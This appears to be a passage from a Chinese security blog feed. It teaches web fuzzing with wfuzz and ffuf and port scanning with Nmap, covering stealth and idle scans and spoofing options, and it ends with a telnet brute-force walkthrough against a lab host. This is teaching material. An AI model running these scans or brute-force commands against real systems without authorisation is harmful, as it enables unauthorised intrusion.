<h2 id="BurpSuite"><a href="#BurpSuite" class="headerlink" title="BurpSuite"></a>BurpSuite</h2><p>在很多模糊测试场景中，研究人员可能会需要手动输出测试Payload，而BurpSuite 可以帮助我们将整个过程以自动化的方式实现。</p>
<p>关于BurpSuite的使用已经讲过很多遍了，这里就不多解释了。</p>
<h2 id="WFuzz"><a href="#WFuzz" class="headerlink" title="WFuzz"></a>WFuzz</h2><h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p>wfuzz 是一款Python开发的Web安全模糊测试工具。</p>
<p>项目地址：<a href="https://github.com/xmendez/wfuzz">https://github.com/xmendez/wfuzz</a></p>
<p>官方手册：<a href="https://wfuzz.readthedocs.io/en/latest/">https://wfuzz.readthedocs.io/en/latest/</a></p>
<h3 id="用途"><a href="#用途" class="headerlink" title="用途"></a>用途</h3><ul>
<li>暴破文件和路径</li>
<li>测试URL中的参数</li>
<li>测试POST请求</li>
<li>测试Cookies</li>
<li>测试自定义请求头</li>
<li>测试HTTP请求方法（动词）</li>
<li>使用代理</li>
<li>认证</li>
<li>递归测试</li>
<li>测试速度与效率</li>
<li>输出到文件</li>
<li>不同的输出</li>
</ul>
<h3 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h3><ul>
<li>基础语法</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wfuzz [options] -z payload,params &lt;url&gt;</span><br></pre></td></tr></table></figure>
<ul>
<li>常用参数</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-z  payloads里面的参数（wfuzz -e payloads 可以查看）</span><br><span class="line"></span><br><span class="line"> -z  file,1.txt（以文件形式，导入1.txt）</span><br><span class="line"></span><br><span class="line"> -z  range,1-10（以范围形式，1到10）</span><br><span class="line"></span><br><span class="line"> -z  list,1-2-3-10（列表形式，1,2,3,10）</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-d   设定POST量</span><br><span class="line"></span><br><span class="line"> -d  “uname=admin&amp;passwd=admin”</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-b   设定cookie量</span><br><span class="line"></span><br><span class="line"> -b  “cookie=”</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-H  设定头部信息</span><br><span class="line"></span><br><span class="line"> -H  “User-Agent: firfox”</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-X  设定请求方法</span><br><span class="line"></span><br><span class="line"> -X  GET</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-R  递归深度，探测目录很好</span><br><span class="line"></span><br><span class="line"> -R 1（深度为1）</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-t   并发数 / -s  请求间隔时间  （这个主要是防拉黑，比如我要fuzz狗）</span><br><span class="line"></span><br><span class="line"> -t 3 -s 5</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-f   输出到文件的格式，格式有raw,json,csv,magictree,html</span><br><span class="line"></span><br><span class="line"> -f /tmp/1,html （将结果输出到tmp目录下的1，以html格式）</span><br></pre></td></tr></table></figure>
<p>输出的结果信息解析：</p>
<p>结果信息</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ID：测试时的请求序  </span><br><span class="line"></span><br><span class="line">Response：HTTP响应码			C</span><br><span class="line"></span><br><span class="line">Lines：响应信息中的行数      	 L</span><br><span class="line"></span><br><span class="line">Word：响应信息中的字数         	 W</span><br><span class="line"></span><br><span class="line">Chars：响应信息中的字符数       	H</span><br><span class="line"></span><br><span class="line">Payload：当前使用的payload</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">隐藏结果  --hc  --hl  --hw  --hh </span><br><span class="line"></span><br><span class="line"> 隐藏响应码405  --hc 405 </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">显示结果   --sc  --sl  --sw  --sh</span><br><span class="line"></span><br><span class="line"> 显示响应码405  --sc 405</span><br></pre></td></tr></table></figure>
<h3 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h3><p>遍历id值隐藏500返回码并保存为html文件：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wfuzz -z range,1-200 --hc 500 -f 1,html http://www.XXX.net/Pro_show.asp?proid=FUZZ</span><br></pre></td></tr></table></figure>
<p>需要一次测试多个FUZZ</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wfuzz -z file,1.txt -z file,2.txt  http://www.xxx.com/FUZZ/FUZ2Z.html</span><br></pre></td></tr></table></figure>
<p>对于需要base64加密的cookie</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wfuzz -z file,1.txt,base64 -b “cookie=”FUZZ” http://www.xxx.com”</span><br></pre></td></tr></table></figure>
<p>探测目录</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wfuzz -z file,common.txt -R 2 -f 2.html,html http://www.baidu.com/FUZZ</span><br></pre></td></tr></table></figure>
<h2 id="FFuF"><a href="#FFuF" class="headerlink" title="FFuF"></a>FFuF</h2><p>ffuf是一款Go语言编写的高速Web Fuzzer工具，该项目深受大型项目gobuster和wfuzz的启发。</p>
<p>项目地址：<a href="https://github.com/ffuf/ffuf/">https://github.com/ffuf/ffuf/</a></p>
<p>用法与wfuzz差不多，就不进行具体介绍了。</p>
<p>具体用法可查看这篇文章：<a href="https://www.cnblogs.com/secxue/p/14617343.html">https://www.cnblogs.com/secxue/p/14617343.html</a></p>
]]></content>
      <categories>
        <category>Web安全</category>
        <category>扫描与枚举</category>
      </categories>
      <tags>
        <tag>模糊测试</tag>
      </tags>
  </entry>
  <entry>
    <title>端口扫描</title>
    <url>/post/cbdcd826.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="网络端口"><a href="#网络端口" class="headerlink" title="网络端口"></a>网络端口</h2><h3 id="何为端口"><a href="#何为端口" class="headerlink" title="何为端口"></a>何为端口</h3><p>在网络技术中，端口(Port)大致有两种意思：一是物理意义上的端口，比如，ADSL Modem、集线器、交换机、路由器用于连接其他网络设备的接口，如RJ-45端口、SC端口等等；二是逻辑意义上的端口，一般是指TCP/IP协议中的端口，端口号的范围从0到65535，比如用于浏览网页服务的80端口，用于FTP服务的21端口等等。</p>
<h3 id="端口分类"><a href="#端口分类" class="headerlink" title="端口分类"></a>端口分类</h3><p>按端口号可分为3大类：</p>
<ul>
<li>公认端口（Well Known Ports）：从0到1023，它们紧密绑定（binding）于一些服务。通常这些端口的通讯明确表明了某种服务的协议。例如：80端口实际上总是HTTP通讯。</li>
<li>注册端口（Registered Ports）：从1024到49151。它们松散地绑定于一些服务。也就是说有许多服务绑定于这些端口，这些端口同样用于许多其它目的。例如：许多系统处理动态端口从1024左右开始。</li>
<li>动态和/或私有端口（Dynamic and/or Private Ports）：从49152到65535。理论上，不应为服务分配这些端口。实际上，机器通常从1024起分配动态端口。但也有例外：SUN的RPC端口从32768开始。</li>
</ul>
<h3 id="常用端口"><a href="#常用端口" class="headerlink" title="常用端口"></a>常用端口</h3><p>21端口：FTP 文件传输服务</p>
<p>22端口：SSH 远程连接服务</p>
<p>23端口：TELNET 终端仿真服务</p>
<p>3389端口：Windows远程登录服务</p>
<p>5938端口：TeamViewer 远程服务管理工具</p>
<p>139端口：NetBIOS 文件与打印共享</p>
<p>445端口：SMB 文件共享</p>
<p>25端口：SMTP 简单邮件传输协议</p>
<p>53端口：DNS 域名解析协议</p>
<p>161端口：SNMP 简单网络管理协议</p>
<p>80端口：HTTP 超文本传输协议</p>
<p>443端口：HTTPS SSL加密的超文本传输协议</p>
<p>3306端口：MYSQL数据库端口</p>
<p>5432端口：PostgreSQL数据库端口</p>
<p>1433端口：SQLServer数据库端口</p>
<p>1521端口：Oracle数据库默认端口</p>
<p>6379端口：Redis数据库端口</p>
<p>27017端口：mongoDB数据库默认端口</p>
<p>8080端口：WWW代理服务端口（Tomcat、JBoss等）</p>
<p>9200端口：Elasticsearch服务器端口</p>
<blockquote>
<p>端口大全：<a href="https://www.douban.com/note/568630865/">https://www.douban.com/note/568630865/</a></p>
</blockquote>
<h2 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h2><h3 id="Nmap的介绍"><a href="#Nmap的介绍" class="headerlink" title="Nmap的介绍"></a>Nmap的介绍</h3><p>Nmap (“Network Mapper(网络映射器)”) 是一款开放源代码的网络探测和安全审核的工具。它的设计目标是快速地扫描大型网络，当然用它扫描单个主机也没有问题。Nmap以新颖的方式使用原始IP报文来发现网络上有哪些主机，那些主机提供什么服务(应用程序名和版本)，那些服务运行在什么操作系统(包括版本信息)， 它们使用什么类型的报文过滤器/防火墙，以及一堆其它功能。虽然Nmap通常用于安全审核，许多系统管理员和网络管理员也用它来做一些日常的工作，比如查看整个网络的信息， 管理服务升级计划，以及监视主机和服务的运行。</p>
<blockquote>
<p>nmap中文手册：<a href="http://www.nmap.com.cn/doc/manual.shtm">http://www.nmap.com.cn/doc/manual.shtm</a></p>
</blockquote>
<h3 id="Nmap的作用"><a href="#Nmap的作用" class="headerlink" title="Nmap的作用"></a>Nmap的作用</h3><ul>
<li>检测活动在网络上的主机（主机发现）</li>
<li>检测主机上的开放端口（端口发现或枚举）</li>
<li>检测到相应的端口（服务发现）的软件或版本</li>
<li>检测操作系统，硬件地址，以及软件版本</li>
<li>检测脆弱性的漏洞（Nmap的脚本）</li>
</ul>
<h3 id="Nmap扫描类型"><a href="#Nmap扫描类型" class="headerlink" title="Nmap扫描类型"></a>Nmap扫描类型</h3><p><img src="https://i.loli.net/2021/10/05/A8CljTvOgLra7bD.png" alt="4ea886c07221756bb40621a525063c45.png"></p>
<h4 id="Connect-扫描"><a href="#Connect-扫描" class="headerlink" title="Connect()扫描"></a>Connect()扫描</h4><p>此扫描试图与每一个TCP端口进行“三次握手”通信。如果能够成功建立接连，则证明端口开发，否则为关闭。准确度很高，但是最容易被防火墙和IDS检测到，并且在目标主机的日志中会记录大量的连接请求以及错误信息。</p>
<p>TCP connect端口扫描服务端与客户端建立连接成功（目标端口开放）的过程：</p>
<p>① Client端发送SYN；</p>
<p>② Server端返回SYN/ACK，表明端口开放；</p>
<p>③ Client端返回ACK，表明连接已建立；</p>
<p>④ Client端主动断开连接。</p>
<p>建立连接成功（目标端口开放）</p>
<p><img src="https://i.loli.net/2021/10/05/gFEvBsa6hcmVOou.png" alt="46a499298383fb5fd45371d3f75f7a72.png"></p>
<p><strong>TCP connect端口扫描服务端与客户端未建立连接成功（目标端口关闭）过程：</strong></p>
<p>① Client端发送SYN；</p>
<p>② Server端返回RST/ACK，表明端口未开放。</p>
<p>未建立连接成功(目标端口关闭)</p>
<p><span style="color: red;">优点</span>：<strong>实现简单</strong>，<strong>对操作者的权限没有严格要求</strong>（有些类型的端口扫描需要操作者具有root权限），系统中的任何用户都有权力使用这个调用，而且如果想要得到从目标端口返回banners信息，也只能采用这一方法。</p>
<p>另一优点是<strong>扫描速度快</strong>。如果对每个目标端口以线性的方式，使用单独的connect()调用，可以通过同时打开多个套接字，从而加速扫描。</p>
<p><span style="color: red;">缺点</span>：是<strong>会在目标主机的日志记录中留下痕迹</strong>，易被发现，<strong>并且数据包会被过滤掉</strong>。目标主机的logs文件会显示一连串的连接和连接出错的服务信息，并且能很快地使它关闭。</p>
<h4 id="SYN扫描"><a href="#SYN扫描" class="headerlink" title="SYN扫描"></a>SYN扫描</h4><p>扫描器向目标主机的一个端口发送请求连接的SYN包，扫描器在收到SYN/ACK后，不是发送的ACK应答而是发送RST包请求断开连接。这样，三次握手就没有完成，无法建立正常的TCP连接，因此，这次扫描就不会被记录到系统日志中。这种扫描技术一般不会在目标主机上留下扫描痕迹。但是，这种扫描需要有root权限。</p>
<p><img src="https://i.loli.net/2021/10/05/To91YVd5qQmH8DW.png" alt="8845cb20fb8c5c43b09d3d9c3ee0f07f.png"></p>
<p><strong>端口开放</strong>：1、Client发送SYN 2、Server端发送SYN/ACK 3、Client发送RST断开（只需要前两步就可以判断端口开放）</p>
<p><strong>端口关闭</strong>：1、Client发送SYN 2、Server端回复RST（表示端口关闭）</p>
<p><span style="color: red;">优点</span>：SYN扫描要比TCP Connect()扫描隐蔽一些，SYN仅仅需要发送初始的SYN数据包给目标主机，如果端口开放，则相应SYN-ACK数据包；如果关闭，则响应RST数据包</p>
<h4 id="秘密扫描"><a href="#秘密扫描" class="headerlink" title="秘密扫描"></a>秘密扫描</h4><p>秘密扫描是一种不被审计工具所检测的扫描技术。</p>
<p>它通常用于在通过普通的防火墙或路由器的筛选（filtering）时隐藏自己。</p>
<p>秘密扫描能躲避IDS、防火墙、包过滤器和日志审计，从而获取目标端口的开放或关闭的信息。由于没有包含TCP 3次握手协议的任何部分，所以无法被记录下来，比半连接扫描更为隐蔽。</p>
<p>但是这种扫描的缺点是扫描结果的不可靠性会增加，而且扫描主机也需要自己构造IP包。现有的秘密扫描有TCP FIN扫描、TCP ACK扫描、NULL扫描、XMAS扫描和SYN/ACK扫描等。</p>
<h5 id="NULL扫描"><a href="#NULL扫描" class="headerlink" title="NULL扫描"></a>NULL扫描</h5><p><strong>反向扫描</strong>——原理是将一个没有设置任何标志位的数据包发送给TCP端口，在正常的通信中至少要设置一个标志位，根据FRC 793的要求，在端口关闭的情况下，若收到一个没有设置标志位的数据字段，那么主机应该舍弃这个分段，并发送一个RST数据包，否则不会响应发起扫描的客户端计算机。也就是说，如果TCP端口处于关闭则响应一个RST数据包，若处于开放则无相应。但是应该知道理由NULL扫描要求所有的主机都符合RFC 793规定，但是windows系统主机不遵从RFC 793标准，且只要收到没有设置任何标志位的数据包时，不管端口是处于开放还是关闭都响应一个RST数据包。但是基于Unix(如Linux)遵从RFC 793标准，所以可以用NULL扫描。 <strong>经过上面的分析，我们知道NULL可以辨别某台主机运行的操作系统是什么操作系统</strong>。</p>
<p><span style="color: red;">端口开放：Client发送Null，Server没有响应</span></p>
<p><img src="https://i.loli.net/2021/10/05/XhoJRmFParscVO8.png" alt="c8492b7911ad031cda1c2397f2591e3d.png"></p>
<p><span style="color: red;">端口关闭：1、Client发送NUll 2、Server回复RST</span></p>
<p><img src="https://i.loli.net/2021/10/05/JxNnrIhd1yYF42k.png" alt="ae2b1f1bbc0be98270853833d4dd318a.png"></p>
<p>说明：Null扫描和前面的TCP Connect（）和SYN的判断条件正好相反。在前两种扫描中，有响应数据包的表示端口开放，<strong>但在NUll扫描中，收到响应数据包表示端口关闭</strong>。反向扫描比前两种隐蔽性高些，但精确度也相对低一些。</p>
<h5 id="FIN扫描"><a href="#FIN扫描" class="headerlink" title="FIN扫描"></a>FIN扫描</h5><p>与NULL有点类似，只是FIN为指示TCP会话结束，在FIN扫描中一个设置了FIN位的数据包被发送后，若响应RST数据包，则表示端口关闭，没有响应则表示开放。此类扫描同样不能准确判断windows系统上端口开发情况。</p>
<p><span style="color: red;">端口开放：发送FIN，没有响应</span></p>
<p><span style="color: red;">端口关闭：1、发送FIN 2、回复RST</span></p>
<h5 id="ACK扫描"><a href="#ACK扫描" class="headerlink" title="ACK扫描"></a>ACK扫描</h5><p>扫描主机向目标主机发送ACK数据包。根据返回的RST数据包有两种方法可以得到端口的信息。方法一是： <strong>若返回的RST数据包的TTL值小于或等于64，则端口开放，反之端口关闭</strong>，如图所示。</p>
<p><img src="https://i.loli.net/2021/10/05/W4IxheAd3rb9QmK.png" alt="ae854a9215ed0aecad110d320c7af9f8.png"></p>
<h5 id="Xmas-Tree扫描"><a href="#Xmas-Tree扫描" class="headerlink" title="Xmas-Tree扫描"></a>Xmas-Tree扫描</h5><p>通过发送带有下列标志位的tcp数据包</p>
<p>URG：指示数据时紧急数据，应立即处理。</p>
<p>PSH：强制将数据压入缓冲区。</p>
<p>FIN：在结束TCP会话时使用。</p>
<p>正常情况下，三个标志位不能被同时设置，但在此种扫描中可以用来判断哪些端口关闭还是开放，与上面的反向扫描情况相同，依然不能判断windows平台上的端口。</p>
<p><span style="color: red;">端口开放：发送URG/PSH/FIN, 没有响应</span></p>
<p><img src="https://i.loli.net/2021/10/05/FtHk1bY2pyfhqij.png" alt="07b4dd67c6489f9380ee350fb16fdc24.png"></p>
<p><span style="color: red;">端口关闭：1、发送URG/PSH/FIN,没有响应 2、响应RST</span></p>
<p><img src="https://i.loli.net/2021/10/05/CZyuMh8E4cWk2sp.png" alt="e49245d04f2b5014427760380b287d33.png"></p>
<p>XMAS扫描原理和NULL扫描的类似，<strong>将TCP数据包中的ACK、FIN、RST、SYN、URG、PSH标志位置1后发送给目标主机。在目标端口开放的情况下，目标主机将不返回任何信息</strong>。</p>
<h4 id="Dump扫描"><a href="#Dump扫描" class="headerlink" title="Dump扫描"></a>Dump扫描</h4><p>也被称为Idle扫描或反向扫描，在扫描主机时应用了第三方僵尸计算机扫描。由僵尸主机向目标主机发送SYN包。目标主机端口开发时回应SYN|ACK，关闭时返回RST，僵尸主机对SYN|ACK回应RST，对RST不做回应。从僵尸主机上进行扫描时，进行的是一个从本地计算机到僵尸主机的、连续的ping操作。查看僵尸主机返回的Echo响应的ID字段，能确定目标主机上哪些端口是开放的还是关闭的。</p>
<p><img src="https://i.loli.net/2021/10/05/qlFyQgdEDtxIopL.png" alt="3641925bcf36c8b38ef9313c686aceb6.png"></p>
<h3 id="常用命令选项"><a href="#常用命令选项" class="headerlink" title="常用命令选项"></a>常用命令选项</h3><p><strong>执行命令</strong>：<code>nmap [扫描类型] [扫描选项]</code></p>
<ul>
<li>扫描类型</li>
</ul>
<div class="table-container">
<table>
<thead>
<tr>
<th>类型</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>-sT</td>
<td>TCP connect()扫描：最基本的扫描方式</td>
</tr>
<tr>
<td>-sS</td>
<td>TCP 同步扫描（TCP SYN）</td>
</tr>
<tr>
<td>-sA</td>
<td>ACK 扫描</td>
</tr>
<tr>
<td>-sN; -sF; -sX</td>
<td>TCP Null，FIN，Xmas-Tree扫描</td>
</tr>
<tr>
<td>-sI &lt;zombie host[:probeport]&gt;</td>
<td>Idle扫描</td>
</tr>
<tr>
<td>-sO</td>
<td>对远程主机所支持的IP协议进行扫描</td>
</tr>
<tr>
<td>-sU</td>
<td>使用UDP扫描</td>
</tr>
<tr>
<td>-sP</td>
<td>使用Ping扫描</td>
</tr>
<tr>
<td>-sW</td>
<td>对滑动窗口的扫描</td>
</tr>
<tr>
<td>-sM</td>
<td>TCP Maimon扫描</td>
</tr>
<tr>
<td>-b  &lt;ftp relay host&gt;</td>
<td>FTP弹跳扫描（FTP bounce scan)</td>
</tr>
<tr>
<td>—scanflags</td>
<td>定制的TCP扫描<br>例如，—scanflags URGACKPSHRSTSYNFIN设置了所有标志位</td>
</tr>
</tbody>
</table>
</div>
<ul>
<li>扫描选项</li>
</ul>
<div class="table-container">
<table>
<thead>
<tr>
<th>通用选项</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>-P0</td>
<td>在扫描之前，不必ping主机</td>
</tr>
<tr>
<td>-PT</td>
<td>在扫描之前使用TCP ping确定哪些主机正在运行</td>
</tr>
<tr>
<td>-PS</td>
<td>对于root用户，这个选项使用SYN包而不是ACK包来对目标主机进行扫描</td>
</tr>
<tr>
<td>-PI</td>
<td>设置这个选项，让nmap使用真正的ping（ICMP echo请求）来扫描目标主机是否正在运行</td>
</tr>
<tr>
<td>-PB</td>
<td>这是默认的ping扫描选项。它使用ACK（-PT）和ICMP（-PI）两种扫描选项并行扫描</td>
</tr>
<tr>
<td>-O</td>
<td>扫描主机的操作系统</td>
</tr>
<tr>
<td>-sV</td>
<td>打开版本探测</td>
</tr>
<tr>
<td>—allports</td>
<td>不为版本探测排除任何端口</td>
</tr>
<tr>
<td>-A</td>
<td>全面扫描</td>
</tr>
<tr>
<td>-v</td>
<td>显示扫描过程</td>
</tr>
<tr>
<td>-p &lt;IP范围&gt;</td>
<td>只扫描指定的端口</td>
</tr>
<tr>
<td>-F</td>
<td>快速 (有限的端口) 扫描</td>
</tr>
<tr>
<td>-r</td>
<td>不要按随机顺序扫描端口</td>
</tr>
<tr>
<td>-T &lt;0-5&gt;</td>
<td>设置调速模板，级别越高扫描速度越快</td>
</tr>
<tr>
<td>-S &lt;IP_Address&gt;</td>
<td>源地址欺骗</td>
</tr>
<tr>
<td>-e &lt;interface&gt;</td>
<td>使用指定的网络接口发送和接收报文</td>
</tr>
<tr>
<td>-g &lt;portnumber&gt;</td>
<td>源端口欺骗</td>
</tr>
<tr>
<td>—data-length  &lt;number&gt;</td>
<td>发送报文时 附加随机数据</td>
</tr>
<tr>
<td>—randomize-hosts</td>
<td>对目标主机的顺序随机排列</td>
</tr>
<tr>
<td>-oN &lt;filespec&gt;</td>
<td>标准输出</td>
</tr>
<tr>
<td>-oX &lt;filespec&gt;</td>
<td>XML输出</td>
</tr>
<tr>
<td>-iL &lt;inputfilename&gt;</td>
<td>从文件列表中输入</td>
</tr>
<tr>
<td>-iR &lt;hostnum&gt;</td>
<td>随机选择目标</td>
</tr>
</tbody>
</table>
</div>
<h3 id="Nmap扫描状态"><a href="#Nmap扫描状态" class="headerlink" title="Nmap扫描状态"></a>Nmap扫描状态</h3><ul>
<li>open ：应用程序在该端口接收 TCP连接和 UDP报文。</li>
<li>closed ：关闭的端口对于nmap也是可访问的，它接收nmap探测报文并作出响应。但没有应用程序在其上监听。</li>
<li>filtered ：由于包过滤阻止探测报文到达端口，nmap无法确定该端口是否开放。过滤可能来自专业的防火墙设备，路由规则 或者主机上的软件防火墙。</li>
<li>unfiltered ：未被过滤状态意味着端口可访问，但是 nmap无法确定它是开放还是关闭。只有用于映射防火墙规则集的 ACK扫描才会把端口分类到这个状态。</li>
<li>open | filtered ：(开放或者被过滤的)：无法确定端口是开放还是被过滤的，开放的端口不响应就是个例子。没有响应也可能意味着报文过滤器丢弃了探测报文或者它引发的任何反应。UDP，IP协议，FIN，Null 等扫描会引起。</li>
<li>closed | filtered ：(关闭或者被过滤的)：无法确定端口是关闭还是被过滤的。</li>
</ul>
<h3 id="常用扫描方案"><a href="#常用扫描方案" class="headerlink" title="常用扫描方案"></a>常用扫描方案</h3><p>1、对单个主机进行全面扫描</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -A 192.168.1.2 </span><br></pre></td></tr></table></figure>
<p>2、使用SYN扫描整个网段</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sS 192.168.1.0/24</span><br></pre></td></tr></table></figure>
<p>3、扫描指定主机的指定端口</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sV -p 0-1024,3389 192.168.1.1-127</span><br></pre></td></tr></table></figure>
<p>4、随机选择100000台主机扫描是否运行Web服务器(80端口)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -v -iR 100000 -p 80</span><br></pre></td></tr></table></figure>
<h3 id="Nmap脚本"><a href="#Nmap脚本" class="headerlink" title="Nmap脚本"></a>Nmap脚本</h3><h4 id="脚本参数"><a href="#脚本参数" class="headerlink" title="脚本参数"></a>脚本参数</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SCRIPT SCAN:</span><br><span class="line">  -sC: equivalent to --script=default</span><br><span class="line">  --script=&lt;Lua scripts&gt;: &lt;Lua scripts&gt; is a comma separated list of</span><br><span class="line">           directories, script-files or script-categories</span><br><span class="line">  --script-args=&lt;n1=v1,[n2=v2,...]&gt;: provide arguments to scripts</span><br><span class="line">  --script-args-file=filename: provide NSE script args in a file</span><br><span class="line">  --script-trace: Show all data sent and received</span><br><span class="line">  --script-updatedb: Update the script database.</span><br><span class="line">  --script-help=&lt;Lua scripts&gt;: Show help about scripts.</span><br><span class="line">           &lt;Lua scripts&gt; is a comma-separated list of script-files or</span><br><span class="line">           script-categories.</span><br></pre></td></tr></table></figure>
<p>上面这部分是Nmap关于脚本的参数，下面一个一个来介绍：</p>
<p><strong>-sC</strong> 是指的是采用默认配置扫描，与<strong>—script=default</strong>参数等价</p>
<p><strong>—script=脚本名称</strong>，脚本一般都在<strong>Nmap的安装目录下的scripts目录中</strong></p>
<p>那么Linux下可以查看脚本数量：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ls /usr/share/nmap/scripts | wc -l</span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2021/10/05/aHpbjvRhzoMP9S8.png" alt="5dfdbf9ebad804bdae51530e4ea4322d.png"></p>
<p>那么我当前的Nmap是有<strong>602</strong>个很使用的漏洞利用、工具脚本。也可以使用下面一条命令导出</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ls /usr/share/nmap/scripts/ | sed &#x27;s/.nse//&#x27; &gt; scripts.list</span><br></pre></td></tr></table></figure>
<p>那么所有的脚本名称都在<strong>scripts.list</strong>中了，这样做的原因是因为我们传递脚本名称的时候，不能写脚本的文件扩展名(.nse)。</p>
<p><strong>—script-args=key1=value1,key2=value2…</strong> 该参数是用来传递脚本里面的参数的，key1是参数名，该参数对应value1这个值，那么有更多的参数，使用逗号连接，后面例子中会给大家讲解。</p>
<p><strong>–script-args-file=filename</strong>，使用文件来为脚本提供参数。</p>
<p><strong>—script-trace</strong> 如果设置该参数，则所有的脚本收发请求过程。</p>
<p><strong>—script-updatedb</strong> 在Nmap的scripts目录里有一个script.db，该文件中保存了当前Nmap可用的脚本，类似于一个小型数据库，如果我们开启nmap并且调用了此参数，则nmap会自行扫描scripts目录中的扩展脚本，进行数据库更新。</p>
<p><strong>—script-help=脚本名称</strong>，调用该参数后，Nmap会输出该脚本名称对应的脚本使用参数，以及详细介绍信息。</p>
<h4 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h4><p>现在我们用一个很简单的脚本，telnet爆破脚本，我们搜索一下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ls /usr/share/nmap/scripts/ | grep telnet</span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2021/10/05/a2wQV4umLnyc9Ai.png" alt="11dafc3bedd4c87c17c238b5b47b19d2.png"></p>
<p>那么可以看到，返回了两个nse脚本名称，那么第一个就是telnet爆破的脚本了，如果不清楚的话，可以使用上面刚介绍过的<strong>—script-help</strong>参数。</p>
<p><img src="https://i.loli.net/2021/10/05/JBvNi3jepwEunqC.png" alt="5e78ad47bd955b4ee396e583bdb25701.png"></p>
<p>可以看到 有一个Nmap的文档地址，正是我们现在想要使用的脚本的详细信息。</p>
<p><img src="https://i.loli.net/2021/10/05/6UN7Zns3MxywR18.png" alt="95d8e6026a3e1dd7beebdb76182d60f0.png"></p>
<p>最后那个 target指的是我们的目标地址。userdb是用户名字典，passdb是密码字典，timeout是每次连接之间的等待超时时间。</p>
<p>当然了，我们也可以直接查看脚本源文件：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">---</span><br><span class="line">-- @usage</span><br><span class="line">--   nmap -p 23 --script telnet-brute --script-args userdb=myusers.lst,passdb=mypwds.lst,telnet-brute.timeout=8s &lt;target&gt;</span><br><span class="line">--</span><br><span class="line">-- @output</span><br><span class="line">-- 23/tcp open  telnet</span><br><span class="line">-- | telnet-brute:</span><br><span class="line">-- |   Accounts</span><br><span class="line">-- |     wkurtz:colonel</span><br><span class="line">-- |   Statistics</span><br><span class="line">-- |_    Performed 15 guesses in 19 seconds, average tps: 0</span><br><span class="line">--</span><br><span class="line">-- @args telnet-brute.timeout   Connection time-out timespec (default: &quot;5s&quot;)</span><br><span class="line">-- @args telnet-brute.autosize  Whether to automatically reduce the thread</span><br><span class="line">--                              count based on the behavior of the target</span><br><span class="line">--                              (default: &quot;true&quot;)</span><br></pre></td></tr></table></figure>
<p>上方这块，可以看到有一个例子，还有常规的扫描结果。那么加粗的这行是笔者故意为之，因为在某些情况下，<strong>管理员可能会更改telnet服务的端口</strong>（这里不只是光指Telnet），那么我们就无法使用这个脚本了。聪明的你一定想到了更改上方的<strong>23</strong>端口吧！但是这还不够灵活～ 我们可以将端口号自制成一个变量，通过我们的脚本参数传递进去。这里不再过多赘述。</p>
<p>下面我们来实战一下，先扫描一下靶机。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sT -Pn -F 192.168.123.188</span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2021/10/05/BVxNAbZiCsk9MaQ.png" alt="d609cbcc9ba1850803475896f11b8802.png"></p>
<p>发现开启了23号端口（telnet服务）</p>
<p>我把字典放到了 <strong>/usr/share/nmap/nselib/data</strong>，因为这个目录中是专门存放Nmap默认字典的。</p>
<p>扫描命令如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -p 23 -Pn --script=telnet-brute --script-args=userdb=admins.lst,passdb=passwords.lst,telnet-brute.timeout=3s --script-trace 192.168.123.188</span><br></pre></td></tr></table></figure>
<p>在这我用<strong>—script-trace</strong>开启了数据的收发开关，扫描结果如下：</p>
<p><img src="https://i.loli.net/2021/10/05/Jz5rloZIT7ymU2P.png" alt="e13b32677cd0c2b986d892cba23166ed.png"></p>
<p>试试使用Telnet登录</p>
<p><img src="/post/edcd4ad56ed5407b9a12c0ce81f3bc93" alt="ed3da32313f541b436115f74b7eee8fe.png"></p>
<p>登录成功！</p>
